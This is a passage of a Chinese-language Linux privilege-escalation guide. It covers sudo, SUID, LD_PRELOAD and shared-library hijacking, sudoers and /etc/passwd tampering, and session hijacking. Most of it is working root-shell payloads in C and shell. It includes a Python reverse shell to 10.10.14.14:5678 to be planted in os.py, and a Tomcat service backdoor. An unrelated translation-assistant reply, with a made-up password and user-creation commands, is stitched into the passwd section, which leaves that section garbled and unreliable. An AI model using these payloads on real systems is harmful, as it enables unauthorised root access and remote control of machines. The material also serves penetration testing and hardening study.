for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### 大 UID

一些 Linux 版本受一个漏洞影响，允许 **UID > INT_MAX** 的用户提权。更多信息: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**利用该漏洞** 使用: **`systemd-run -t /bin/bash`**

### 组

检查你是否是可能授予你 root 权限的 **某个组的成员**：


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### 剪贴板

检查剪贴板中是否有任何有价值的内容（如果可能）
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 密码策略
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 已知密码

如果你**知道环境中的任何密码**，**使用该密码尝试以每个用户身份登录**。

### Su Brute

如果你不介意制造大量噪音，并且目标主机上存在 `su` 和 `timeout` 二进制文件，你可以使用 [su-bruteforce](https://github.com/carlospolop/su-bruteforce)。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 使用 `-a` 参数也会尝试 brute-force 用户。

## 可写 $PATH 滥用

### $PATH

如果你发现你可以**在 $PATH 的某个文件夹中写入**，你可能能够通过**在可写文件夹中创建一个名为将由另一个用户（理想情况下为 root）执行的命令的 backdoor**来提升权限，且该命令**不会从位于你的可写文件夹之前的文件夹加载**到 $PATH。

### SUDO and SUID

你可能被允许使用 sudo 执行某些命令，或某些命令可能设置了 suid 位。使用以下命令检查：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
一些**意想不到的命令允许你读取和/或写入文件，甚至执行命令。**例如：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo 配置可能允许用户在不知道密码的情况下，以另一个用户的权限执行某些命令。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
在这个例子中，用户 `demo` 可以以 `root` 身份运行 `vim`，现在通过将 ssh key 添加到 root 目录或调用 `sh` 来获取 shell 变得非常容易。
```
sudo vim -c '!sh'
```
### SETENV

此指令允许用户在执行某些操作时**设置环境变量**：
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
此示例，**based on HTB machine Admirer**，**vulnerable** to **PYTHONPATH hijacking**，可在以 root 身份执行脚本时加载任意 python library：
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV 被 sudo env_keep 保留 → root shell

如果 sudoers 保留 `BASH_ENV`（例如 `Defaults env_keep+="ENV BASH_ENV"`），你可以利用 Bash 的非交互启动行为，在调用被允许的命令时以 root 身份运行任意代码。

- Why it works: 对于非交互式 shells，Bash 会评估 `$BASH_ENV` 并在运行目标脚本之前 source 那个文件。许多 sudo 规则允许运行脚本或 shell 包装器。如果 `BASH_ENV` 被 sudo 保留，你的文件将在 root 权限下被 source。

- Requirements:
- 你可以运行的 sudo 规则（任何非交互式调用 `/bin/bash` 的目标，或任何 bash 脚本）。
- `BASH_ENV` 在 `env_keep` 中（使用 `sudo -l` 检查）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- 硬化:
- 移除 `BASH_ENV`（和 `ENV`）从 `env_keep`，优先使用 `env_reset`。
- 避免为 sudo 允许的命令使用 shell 包装器；使用最小化的二进制文件。
- 考虑在使用保留的 env vars 时对 sudo I/O 进行日志记录和告警。

### Sudo 执行绕过路径

**跳转**以读取其他文件或使用 **symlinks**。例如在 sudoers 文件中: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
如果使用 **wildcard** (\*), 就更容易:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**缓解措施**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary 没有指定命令路径

如果将 **sudo permission** 授予单个命令且**未指定路径**：_hacker10 ALL= (root) less_，可以通过更改 PATH variable 来利用它。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
当一个 **suid** binary **在执行另一个命令时未指定路径（始终用** _**strings**_ **检查可疑 SUID binary 的内容）时，也可以使用此技术。

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary 带命令路径

如果 **suid** binary **执行另一个命令并指定了路径**，那么，你可以尝试 **export a function**，其名称与 suid 文件正在调用的命令相同。

例如，如果一个 suid binary 调用 _**/usr/sbin/service apache2 start**_，你需要尝试创建该函数并导出它：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
然后，当你调用 suid binary 时，该函数会被执行。

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 环境变量用于指定一个或多个共享库（.so 文件），这些库会被加载器在其他库之前加载，包括标准 C 库（`libc.so`）。这个过程称为预加载库。

但是，为了维护系统安全并防止该功能被滥用，尤其是在 **suid/sgid** 可执行文件上，系统会施加一些限制：

- 当可执行文件的真实用户 ID（_ruid_）与有效用户 ID（_euid_）不一致时，加载器会忽略 **LD_PRELOAD**。
- 对于带有 suid/sgid 的可执行文件，只有位于标准路径且同样为 suid/sgid 的库才会被预加载。

如果你能够使用 `sudo` 执行命令，且 `sudo -l` 的输出包含语句 **env_keep+=LD_PRELOAD**，则可能发生权限提升。此配置允许 **LD_PRELOAD** 环境变量在使用 `sudo` 运行命令时继续保留并被识别，可能导致以提升的权限执行任意代码。
```
Defaults        env_keep += LD_PRELOAD
```
保存为 **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
然后使用以下命令 **compile it**：
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最后，**escalate privileges** 运行
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 如果攻击者控制了 **LD_LIBRARY_PATH** env 变量，就可以滥用类似的 privesc，因为他控制了库将被搜索的路径。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID 二进制 – .so injection

当遇到具有 **SUID** 权限且看起来异常的二进制文件时，最好验证它是否正确加载 **.so** 文件。可以通过运行以下命令来检查：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例如，遇到类似错误 _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ 表明存在利用的可能性。

要利用这一点，可以创建一个 C 文件，例如 _"/path/to/.config/libcalc.c"_，其中包含以下代码：
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
这段代码在编译并执行后，旨在通过修改文件权限并执行一个提权的 shell 来获得更高权限。

使用以下命令将上述 C 文件编译为共享对象 (.so) 文件：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最后，运行受影响的 SUID 二进制文件应触发该 exploit，从而可能导致系统被攻陷。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
既然我们已经发现一个 SUID binary 会从我们可写的文件夹加载库，就在该文件夹中创建具有所需名称的库：
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
如果你遇到类似如下的错误
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) 是一个整理的 Unix 二进制文件列表，攻击者可以利用这些文件来绕过本地安全限制。 [**GTFOArgs**](https://gtfoargs.github.io/) 用于只能在命令中**注入参数**的情况。

该项目收集了 Unix 二进制文件的合法功能，这些功能可能被滥用来逃离受限 shell、提升或保持更高权限、传输文件、生成 bind 和 reverse shells，并便于其他后利用任务。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

在拥有 **sudo access** 但不知道密码的情况下，你可以通过**等待 sudo 命令执行然后劫持会话令牌**来提升权限。

Requirements to escalate privileges:

- You already have a shell as user "_sampleuser_"
- "_sampleuser_" have **used `sudo`** to execute something in the **last 15mins** (by default that's the duration of the sudo token that allows us to use `sudo` without introducing any password)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` is accessible (you can be able to upload it)

(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- 该 **第二个 exploit** (`exploit_v2.sh`) 会在 _/tmp_ 创建一个 sh shell，**归 root 所有并具有 setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **第三个 exploit** (`exploit_v3.sh`) 将 **创建一个 sudoers 文件**，使 **sudo tokens 永久有效并允许所有用户使用 sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

如果你在该目录或目录内任何已创建的文件上具有 **write permissions**，你可以使用二进制文件 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) 来 **create a sudo token for a user and PID**.\
例如，如果你可以 overwrite 文件 _/var/run/sudo/ts/sampleuser_，并且你以该 user 的 shell 运行且 PID 为 1234，你可以 **obtain sudo privileges**，无需知道密码，通过执行：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

文件 `/etc/sudoers` 以及 `/etc/sudoers.d` 中的文件用于配置谁可以使用 `sudo` 以及如何使用。\
这些文件**默认情况下只能由 root 用户和 root 组 读取**。\
**如果** 你能 **读取** 这个文件，你可能能够 **获取一些有趣的信息**，如果你可以 **写入** 任意文件，你将能够 **提升权限**。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
如果你可以写入，你就可以滥用此权限
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
滥用这些权限的另一种方式：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

有些替代 `sudo` 二进制文件的选项，例如 OpenBSD 的 `doas`，请记得检查其配置位于 `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

如果你知道某个**用户通常连接到机器并使用 `sudo`** 来提升权限，且你已经在该用户上下文获得了一个 shell，你可以**创建一个新的 sudo 可执行文件**，它会以 root 身份先执行你的代码，然后再执行用户的命令。接着，**修改该用户上下文的 $PATH**（例如在 .bash_profile 中添加新路径），这样当用户执行 sudo 时，就会执行你创建的 sudo 可执行文件。

注意，如果用户使用不同的 shell（非 bash），你需要修改其他文件以添加新路径。例如[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) 会修改 `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`。你可以在 [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) 找到另一个示例。

或者运行类似下面的命令：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共享库

### ld.so

文件 `/etc/ld.so.conf` 指示 **加载的配置文件来自何处**。通常，此文件包含以下路径： `include /etc/ld.so.conf.d/*.conf`

这意味着会读取来自 `/etc/ld.so.conf.d/*.conf` 的配置文件。这些配置文件 **指向其他文件夹**，系统将在这些文件夹中 **搜索库**。例如，`/etc/ld.so.conf.d/libc.conf` 的内容是 `/usr/local/lib`。**这意味着系统会在 `/usr/local/lib` 中搜索库**。

如果由于某种原因 **某用户具有写权限** 于任意所示路径：`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 中的任意文件或 `/etc/ld.so.conf.d/*.conf` 中配置的任意文件夹，他可能能够提升权限。\
请参阅以下页面，了解 **如何利用此错误配置**：


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
通过将 lib 复制到 `/var/tmp/flag15/`，程序会在该位置使用它，正如 `RPATH` 变量所指定的。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
然后在 `/var/tmp` 创建一个恶意库，使用 `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities 提供进程可用 root 特权的**子集**。这实际上把 root 的 **特权划分为更小且独立的单元**。这些单元可以被独立地授予给进程。通过这种方式减少了完整特权集，从而降低被利用的风险。\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

在目录中，**bit for "execute"** 表示受影响的用户可以 "**cd**" 进入该文件夹。\
**"read"** bit 表示用户可以 **列出** **文件**，而 **"write"** bit 表示用户可以 **删除** 并 **创建** 新的 **文件**。

## ACLs

Access Control Lists (ACLs) 代表可自由裁量权限的第二层，能够**覆盖传统的 ugo/rwx 权限**。这些权限通过允许或拒绝对非所有者或非组成员的特定用户的权利来增强对文件或目录访问的控制。这个层级的**细粒度确保更精确的访问管理**。更多细节请见 [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**获取** 系统中具有特定 ACLs 的文件：
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## 打开 shell 会话

在 **旧版本** 中，你可能可以 **hijack** 某个不同用户的 **shell** 会话（**root**）。\
在 **最新版本** 中，你只能 **connect** 到属于 **你自己的用户** 的 screen sessions。 然而，你可能会在会话中发现 **有趣的信息**。

### screen sessions hijacking

**列出 screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**附加到会话**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux 会话劫持

这是 **旧的 tmux 版本** 的问题。我作为非特权用户无法劫持由 root 创建的 tmux (v2.1) 会话。

**列出 tmux 会话**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**附加到会话**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006年9月到2008年5月13日之间在基于 Debian 的系统（Ubuntu、Kubuntu 等）上生成的所有 SSL 和 SSH 密钥可能受此漏洞影响。\
该漏洞在这些操作系统创建新的 ssh key 时产生，因为 **仅有 32,768 种变体**。这意味着可以枚举出所有可能性，并且**拥有 ssh public key 就可以搜索对应的 private key**。可以在这里找到已计算出的可能性: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** 指定是否允许密码认证。默认是 `no`。
- **PubkeyAuthentication:** 指定是否允许公钥认证。默认是 `yes`。
- **PermitEmptyPasswords**: 当允许密码认证时，指定服务器是否允许使用空密码字符串的账户登录。默认是 `no`。

### PermitRootLogin

指定是否允许 root 使用 ssh 登录，默认是 `no`。可能的取值：

- `yes`: root 可以使用密码或私钥登录
- `without-password` or `prohibit-password`: root 只能通过私钥登录
- `forced-commands-only`: root 只能使用私钥登录，且必须指定命令选项
- `no` : 不允许

### AuthorizedKeysFile

指定包含可用于用户认证的公钥的文件。它可以包含像 `%h` 这样的 token，%h 会被替换为主目录。**可以指定绝对路径**（以 `/` 开头）或**从用户主目录的相对路径**。例如：
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
该配置表示，如果你尝试使用用户 "**testusername**" 的 **私钥** 登录，ssh 会将你密钥的公钥与位于 `/home/testusername/.ssh/authorized_keys` 和 `/home/testusername/access` 中的条目进行比较。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding 允许你 **使用本地 SSH 密钥而不是把密钥留在服务器上**（没有密码短语！）。因此，你可以通过 ssh **跳到某个主机**，然后从那里 **跳到另一个主机**，**使用**位于你**初始主机**上的**密钥**。

你需要在 `$HOME/.ssh.config` 中设置此选项，如下：
```
Host example.com
ForwardAgent yes
```
注意，如果 `Host` 是 `*`，每次用户跳转到不同机器时，该主机都能访问这些密钥（这是一个安全问题）。

文件 `/etc/ssh_config` 可以 **覆盖** 这些 **选项** 并允许或拒绝此配置。\
文件 `/etc/sshd_config` 可以通过关键字 `AllowAgentForwarding` **允许**或**拒绝** ssh-agent 转发（默认允许）。

如果你发现环境中配置了 Forward Agent，请阅读以下页面，因为**你可能能够滥用它来提升权限**：


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 有趣的文件

### 配置文件

文件 `/etc/profile` 以及 `/etc/profile.d/` 下的文件是 **在用户启动新 shell 时执行的脚本**。因此，如果你能够 **写入或修改其中的任何一个文件，就可以提升权限**。
```bash
ls -l /etc/profile /etc/profile.d/
```
如果发现任何可疑的 profile 脚本，应该检查其中是否包含 **敏感信息**。

### Passwd/Shadow 文件

根据操作系统，`/etc/passwd` 和 `/etc/shadow` 文件的名称可能不同，或者可能存在备份。因此，建议 **查找所有这些文件** 并 **检查是否可以读取**，以查看 **文件中是否包含哈希**：
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
在某些情况下，你可能会在 `/etc/passwd`（或等效）文件中发现 **password hashes**
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 可写的 /etc/passwd

首先，使用下面的任一命令生成一个密码。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
我没有收到 src/linux-hardening/privilege-escalation/README.md 的内容。请把该文件的英文内容贴上来，或者上传文件，我会把相关英文翻译成中文并严格保留原有的 Markdown/HTML 语法与路径/标签不变。

下面是我为你生成的强密码和在本地系统上创建用户的命令（注意：我无法在你的机器上直接执行这些命令，需要你在目标主机上以有权限的账户运行）。

生成的密码（请保存好）：V4x!9tQz#e7Bg1K2

在 Linux 上添加用户并设置密码（在目标机器上运行）：
```
sudo useradd -m -s /bin/bash hacker
echo 'hacker:V4x!9tQz#e7Bg1K2' | sudo chpasswd
sudo chage -d 0 hacker    # 强制第一次登录时更改密码（可选）
```

如果还需要赋予 sudo 权限（仅在你确实需要时运行）：
```
sudo usermod -aG sudo hacker
```

把 README.md 内容发过来后，我会进行翻译并返回保留原有 Markdown/HTML 的中文版本。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例如： `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

你现在可以使用 `su` 命令，使用 `hacker:hacker`

或者，你可以使用下面的几行添加一个没有密码的虚拟用户。\
警告：你可能会降低该机器当前的安全性。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意：在 BSD 平台上 `/etc/passwd` 位于 `/etc/pwd.db` 和 `/etc/master.passwd`，另外 `/etc/shadow` 被重命名为 `/etc/spwd.db`。

你应该检查是否可以**写入某些敏感文件**。例如，你能否写入某个**服务配置文件**？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例如，如果机器正在运行 **tomcat** 服务器，并且您可以 **修改 /etc/systemd/ 中的 Tomcat 服务配置文件，** 那么您可以修改以下行：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
你的后门将在下次启动 tomcat 时被执行。

### 检查文件夹

以下文件夹可能包含备份或有趣的信息： **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root**（你可能无法读取最后一个，但可以尝试）
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇怪的位置/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 最近几分钟内修改的文件
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB 文件
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 文件
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隐藏文件
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH 中的脚本/二进制文件**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web 文件**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **备份**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 已知可能包含密码的文件

阅读 [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 的代码，它会搜索 **多个可能包含密码的文件**。\
**另一个有趣的工具** 是: [**LaZagne**](https://github.com/AlessandroZ/LaZagne)，这是一个开源应用，用于检索存储在本地计算机上的大量密码，适用于 Windows、Linux & Mac。

### 日志

如果你能读取日志，可能会在其中发现 **有趣/机密的信息**。日志越异常，通常越有价值（大概如此）。\
另外，某些“**bad**”配置（backdoored?）的 **审计日志** 可能允许你将 **密码** 记录到审计日志中，正如这篇文章所解释的: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
为了能够读取日志，组 [**adm**](interesting-groups-linux-pe/index.html#adm-group) 会非常有帮助。

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

你还应该检查文件名或文件内容中包含 "**password**" 一词的文件，并检查日志中是否包含 IP 和邮箱，或 hashes 的正则匹配。\
我不会在这里列出如何完成所有这些操作，但如果你有兴趣可以查看 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) 执行的最后几项检查。

## Writable files

### Python library hijacking

如果你知道一个 **python** 脚本将从 **哪里** 被执行，并且你 **可以在该文件夹中写入** 或者你可以 **modify python libraries**，你可以修改 OS library 并给它植入后门（如果你可以在 python 脚本将被执行的位置写入，复制并粘贴 os.py 库）。

To **backdoor the library** just add at the end of the os.py library the following line (更改 IP 和 PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

